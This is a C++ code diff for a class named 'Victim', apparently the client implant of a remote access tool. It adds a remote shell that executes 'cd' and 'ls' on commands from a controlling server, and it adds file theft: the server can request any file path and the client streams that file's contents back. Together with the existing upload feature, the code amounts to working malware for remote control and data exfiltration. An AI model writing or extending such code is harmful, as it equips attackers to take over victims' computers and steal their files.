@@ -48,22 +48,40 @@ int Victim::runProcess()
 		if (cmd == uint8_t(Cmd::START_SSH)) {
 			isSshActive = true;
 			std::cout << "start ssh\n";
+
+			std::string msg = " " + std::filesystem::current_path().string() + "> ";
+			sf::Packet res;
+			res << uint16_t(0) << uint8_t(Cmd::SSH_DATA) << msg;
+			auto _ = server.send(res);
 		}
 		//end ssh session
 		else if (cmd == uint8_t(Cmd::END_SSH)) {
 			isSshActive = false;
 			std::cout << "stop ssh\n";
+
+			destFilePath = "";
+			destFileExt = "";
+			sendFilePacketsMissing = 0;
+
+			sourceFilePath = "";
+			getFilePacketsSent = 0;
 		}
 		//receive ssh data
 		else if (cmd == uint8_t(Cmd::SSH_DATA)) {
 			std::string data;
 			p >> data;
 
-			std::cout << "data: #" << data << "#\n";
+			std::string msg = data + "\n";
+			try {
+				msg += processCommand(data);
+			}
+			catch (const std::exception& e) {
+				msg += std::string(e.what()) + "\n";
+			}
+			msg += " " + std::filesystem::current_path().string() + "> ";
 
-			std::string resStr = "received and processed #" + data + "#\n";
 			sf::Packet res;
-			res << uint16_t(0) << uint8_t(Cmd::SSH_DATA) << resStr;
+			res << uint16_t(0) << uint8_t(Cmd::SSH_DATA) << msg;
 			auto _ = server.send(res);
 		}
 		//receive mouse position data
@@ -190,13 +208,13 @@ int Victim::runProcess()
 			res << uint16_t(reqId) << uint8_t(Cmd::SSH_START_SENDING_FILE);
 			std::ofstream file(destFilePath);
 			if (file.good()) {
-				filePacketsMissing = n;
+				sendFilePacketsMissing = n;
 				res << true;
 			}
 			else {
 				destFileExt = "";
 				destFilePath = "";
-				filePacketsMissing = 0;
+				sendFilePacketsMissing = 0;
 				res << false;
 			}
 
@@ -213,15 +231,15 @@ int Victim::runProcess()
 
 			std::ofstream file(destFilePath, std::ios::app | std::ios::binary);
 			if (file.write(data, size)) {
-				sf::Packet p; 
-				p << reqId << uint8_t(Cmd::SSH_SEND_FILE_DATA);
-				auto _ = server.send(p);
+				sf::Packet res; 
+				res << reqId << uint8_t(Cmd::SSH_SEND_FILE_DATA);
+				auto _ = server.send(res);
 				
-				filePacketsMissing--;
-				
-				if (filePacketsMissing == 0) {
+				sendFilePacketsMissing--;
+				if (sendFilePacketsMissing == 0) {
 					file.close();
-					std::cout << std::rename(destFilePath.c_str(), (destFilePath + destFileExt).c_str());
+					auto _ = std::rename(destFilePath.c_str(), (destFilePath + destFileExt).c_str());
+
 					destFileExt = "";
 					destFilePath = "";
 				}
@@ -229,8 +247,48 @@ int Victim::runProcess()
 			else {
 				destFileExt = "";
 				destFilePath = "";
-				filePacketsMissing = 0;
+				sendFilePacketsMissing = 0;
 			}
+		}
+		else if (cmd == uint8_t(Cmd::SSH_START_GETTING_FILE)) {
+			getFilePacketsSent = 0;
+			p >> sourceFilePath;
+			sf::Packet res;
+			res << reqId << uint8_t(Cmd::SSH_START_GETTING_FILE);
+
+			//check if source file is valid
+			std::ifstream file(sourceFilePath, std::ifstream::ate | std::ifstream::binary);
+			auto size = file.tellg();
+			if (size == -1) {
+				res << uint32_t(0);
+				sourceFilePath = "";
+			}
+			else
+				res << uint32_t(std::ceil(size / long double(packetSize)));
+
+			auto _ = server.send(res);
+		}
+		else if (cmd == uint8_t(Cmd::SSH_GET_FILE_DATA)) {
+			if (sourceFilePath == "")
+				continue;
+
+			std::ifstream file(sourceFilePath, std::ios::binary);
+			file.seekg(getFilePacketsSent * packetSize);
+			std::unique_ptr<char[]> buffer(new char[packetSize]());
+			file.read(buffer.get(), packetSize);
+
+			size_t bytesRead = file.gcount();
+			if (bytesRead <= 0) {
+				sourceFilePath = "";
+				getFilePacketsSent = 0;
+				continue;
+			}
+			getFilePacketsSent++;
+
+			sf::Packet res;
+			res << reqId << uint8_t(Cmd::SSH_GET_FILE_DATA);
+			res.append(buffer.get(), bytesRead);
+			auto _ = server.send(res);
 		}
 
 		//unknown command
@@ -301,4 +359,58 @@ bool Victim::connectServer()
 
 	res >> myId;
 	return true;
+}
+
+std::string Victim::processCommand(const std::string& cmd) const
+{
+	std::vector<std::string> param;
+	std::string current;
+	bool inQuotes = false;
+	for (size_t i = 0; i < cmd.size(); ++i) {
+		unsigned char c = cmd[i];
+
+		if (c == '"') {
+			inQuotes = !inQuotes;
+			if (!current.empty()) {
+				param.push_back(current);
+				current.clear();
+			}
+			continue;
+		}
+
+		if (std::isspace(c) && !inQuotes) {
+			if (!current.empty()) {
+				param.push_back(current);
+				current.clear();
+			}
+		}
+		else
+			current += c;
+	}
+
+	if (!current.empty())
+		param.push_back(current);
+
+	if (param.empty())
+		return "";
+
+	if (param[0] == "cd") {
+		std::filesystem::current_path(param[1]);
+		return "";
+	}
+	if (param[0] == "ls") {
+		std::string output;
+		for (const auto& entry : std::filesystem::directory_iterator(".")) {
+			output += entry.path().filename().string();
+
+			if (entry.is_directory())
+				output += " [DIR]";
+			else if (entry.is_regular_file())
+				output += " [FILE]";
+			output += "\n";
+		}
+		return output;
+	}
+
+	return "unable to process command\n";
 }
